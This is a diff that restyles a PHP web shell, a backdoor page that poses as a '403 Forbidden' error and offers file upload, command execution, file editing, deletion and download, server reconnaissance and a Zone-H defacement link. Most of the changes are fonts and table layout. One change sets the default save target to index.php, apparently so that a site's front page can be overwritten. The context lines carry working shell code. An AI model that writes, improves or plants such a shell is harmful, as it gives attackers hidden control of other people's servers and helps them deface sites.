@@ -20,41 +20,44 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 <title>403 Forbidden</title>
 <meta name='author' content='403 Forbidden'>
 <meta charset="UTF-8">
+<link href="https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap" rel="stylesheet">
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Abel);
 @import url(http://fonts.googleapis.com/css?family=Iceberg);
+@import url(https://fonts.googleapis.com/css2?family=Kelly+Slab);
 
 *, body, html{cursor: url(http://cur.cursors-4u.net/cursors/cur-9/cur863.ani), url(http://cur.cursors-4u.net/cursors/cur-9/cur863.png), default !important;}
-html {background: #111111;color: #ffffff;font-family: 'Iceberg';font-size: 13px;width: 100%;}
-li {display: inline;margin: 5px;padding: 5px;}
-table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Iceberg';font-size: 13px;}
+html {background: #111111;color: #ffffff;font-family: 'Kelly Slab';font-size: 15px;width: 100%;margin-left:auto;margin-right:auto;}
+li {display: inline;margin: 5px;padding: 0px;}
+table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Kelly Slab';font-size: 15px;}
 .table_home, .th_home, .td_home {border: 1px solid #ffffff;}
 .table_home tr:hover {background-color: green;}
 .th_home tr:hover{background-color: #1a1a1a;}
 .wenk{color: #00bfff;}
 th {padding: 10px;}
 a {color: #ffffff;text-decoration: none;}
-a:hover {color: gold;text-decoration: underline;text-shadow: 0pt 0pt 0.9em #00bfff, 0pt 0pt 0.9em #00bfff;color: #00ff00;text-decoration: none;}
+a:hover {color: gold;text-decoration: underline;color: #00ff00;text-decoration: none;}
 #tangina:hover{ background-color: #1a1a1a; }
 b {color: gold;}
 input[type=text], input[type=password],input[type=submit] {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;
-    font-family: 'Abel';font-size: 13px;}
-textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Abel';font-size: 13px;}
-select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
-.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
-li a:hover{text-shadow: 0pt 0pt 0.99em #00bfff, 0pt 0pt 0.99em #00bfff;color: #00ff00;text-decoration: none;}
-.th_home, .titulo {text-shadow: 0pt 0pt 0.99em #00bfff, 0pt 0pt 0.99em #00bfff;color: #00ff00;text-decoration: none;}
+    font-family: 'Kelly Slab';font-size: 15px;}
+textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Kelly Slab';font-size: 15px;}
+select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 15px;}
+.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 15px;}
+li a:hover{color: #00ff00;text-decoration: none;}
+.th_home, .titulo {color: #00ff00;text-decoration: none;}
 .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
-.board p {font-size: 65px;font-family: 'Monoton', cursive;color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
+.board p {font-size: 65px;font-family: 'Kelly Slab';color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
 
 </style>
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Ubuntu);
+@import url(https://fonts.googleapis.com/css2?family=Kelly+Slab);
 html {
     background: #1e1e1e;
 	color: #ffffff;
-	font-size: 14px;
-	width: 100%;
+	font-size: 15px;
+	width: 99%;
 }
 
 li {
@@ -78,18 +81,21 @@ b {
 }
 
 pre {
-	font-size: 13px;
+    font-family: 'Kelly Slab';
+    font-size: 15px;
+    border: 1px solid #ffc107;
+    padding: 5px;
 }
 
 table, th, td {
 	border-collapse:collapse;
 	background: transparent;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+	font-family: 'Kelly Slab';
+	font-size: 15px;
 }
 
 .table_home, .th_home, .td_home {
-	border: 1px solid #ffffff;
+	border: 1px solid yellow;
 }
 
 .th_home {
@@ -118,8 +124,8 @@ input[type=text], input[type=password], .input {
 	color: #ffffff;
 	border: 1px solid #ffffff;
 	padding: 3px;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+	font-family: 'Kelly Slab';
+	font-size: 15px;
 }
 
 input[type=submit] {
@@ -143,8 +149,8 @@ textarea {
 	resize: none;
 	background: transparent;
 	color: #ffffff;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+	font-family: 'Kelly Slab';
+	font-size: 15px;
 }
 iframe {
 	width: 100%;
@@ -411,16 +417,15 @@ function serverinfo() {
 	$disable_functions = @ini_get('disable_functions');
 	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
 
-	$output[] = "<font face=courier><i>SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
+	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
 	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
 	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
 	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
 	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
 	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
 	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
-	$output[] = "DISABLE FUNC: $disable_functions";
 	$output[] = lib_installed();
-	$output[] = "Current Dir (".writeable(path(), perms(path())).")</font> ";
+	$output[] = "Current Dir (".writeable(path(), perms(path())).")";
 
 	print "<pre>";
 	print implode("<br>", $output);
@@ -632,7 +637,7 @@ function tools($toolsname, $args = null) {
 		if($_POST['upload']) {
 			if($_POST['uploadtype'] === '1') {
 				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
-					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
+					$act = color(1, 2, "Uploaded!")." at <b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b>";
 				} 
 				else {
 					$act = color(1, 1, "Failed to upload file!");
@@ -643,7 +648,7 @@ function tools($toolsname, $args = null) {
 				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
 				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
 					if(@copy($_FILES['file']['tmp_name'], $root)) {
-						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
+						$act = color(1, 2, "Uploaded!")." at <b>$root -> </b><a href='http://$web' target='_blank'>$web</a>";
 					} 
 					else {
 						$act = color(1, 1, "Failed to upload file!");
@@ -1014,7 +1019,7 @@ function files_and_folder() {
 		   <th class="th_home"><center>Last Modified</center></th>
 		   <th class="th_home"><center>Owner/Group</center></th>
 		   <th class="th_home"><center>Permission</center></th>
-		   <th class="th_home"><center>Action</center></th>
+		   <th class="th_home" colspan="4"><center>Action</center></th>
 		   </tr>';
 
 	if(function_exists('opendir')) {
@@ -1037,7 +1042,14 @@ function files_and_folder() {
 		$dirinfo['size']  = "-";
 		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
 		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
-		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
+		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "
+<a href='?act=newfile&dir=".path()."'>newfile</a>
+<td class='td_home' style='text-align: center;'> - </td>
+<td class='td_home' style='text-align: center;'> - </td>
+<td class='td_home' style='text-align: center;'><a href='?act=newfolder&dir=".path()."'>newfolder</a></td>" : " - 
+<td class='td_home' style='text-align: center;'><a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a></td>
+<td class='td_home' style='text-align: center;'><a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a></td>
+<td class='td_home' style='text-align: center;'> - </td>";
 		if(function_exists('posix_getpwuid')) {
 			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
 			$dirinfo['owner'] = $dirinfo['owner']->name;
@@ -1057,7 +1069,7 @@ function files_and_folder() {
 		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
 		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
 		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
-		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['action']."</td>";
 		print "</tr>";
 	}
 	foreach($dir as $files) {
@@ -1088,7 +1100,10 @@ function files_and_folder() {
 		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
 		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
 		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
-		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
+		print "<td class='td_home' style='text-align: center;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a></td>
+                       <td class='td_home' style='text-align: center;'><a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a></td>
+                       <td class='td_home' style='text-align: center;'><a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a></td>
+                       <td class='td_home' style='text-align: center;'><a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
 		print "</tr>";
 	}
 
@@ -1100,7 +1115,7 @@ function files_and_folder() {
 function action() {
 	tools("upload");
 	tools("cmd");
-	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+	print "<pre>";
 	print "<center>";
 	print "<ul>";
 	print "<li>[ <a href='?'>Home Shell</a> ]</li>";
@@ -1112,7 +1127,7 @@ function action() {
 	print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H</a> ]</li>";
 	print "</ul>";
 	print "</center>";
-	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+	print "</pre>";
 
 
 	if(isset($_GET['do'])) {
@@ -1620,7 +1635,7 @@ function action() {
 			}
 			print $act;
 			print "<form method='post'>
-			Filename: <input type='text' name='filename' value='".path()."/asu.php' style='width: 450px;' height='10'>
+			Filename: <input type='text' name='filename' value='".path()."/index.php' style='width: 450px;' height='10'>
 			<input type='submit' class='input' name='save' value='SUBMIT'>
 			</form>";
 		} 
